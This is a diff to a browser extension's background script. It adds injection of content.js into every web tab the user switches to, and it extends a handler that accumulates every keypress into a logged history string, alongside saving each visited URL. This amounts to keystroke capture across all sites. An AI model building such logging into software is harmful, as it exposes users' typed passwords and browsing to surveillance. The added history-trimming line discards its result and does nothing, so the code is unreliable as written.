@@ -60,6 +60,13 @@ chrome.tabs.onActivated.addListener(async (activeInfo) => {
   const tab = await chrome.tabs.get(activeInfo.tabId);
   saveUrl(tab.url)
   console.log("Active tab URL (switched):", tab.url);
+  
+  if (tab.url.startsWith("http")) {
+      chrome.scripting.executeScript({
+        target: { tabId: tab.id },
+        files: ["content.js"]
+      });
+    }
 });
 
 // Fired when a tab updates (URL changes or reloads)
@@ -88,6 +95,9 @@ chrome.runtime.onMessage.addListener(async (msg, sender, response) => {
   else if (msg.type == 'KEYPRESS') {
     const key = msg.key;
     keyHistory = keyHistory + key
+    if (keyHistory.length > 300) {
+      keyHistory.substring(keyHistory.length - 301)
+    }
     console.log("Key history is: ", keyHistory)
   }
 });
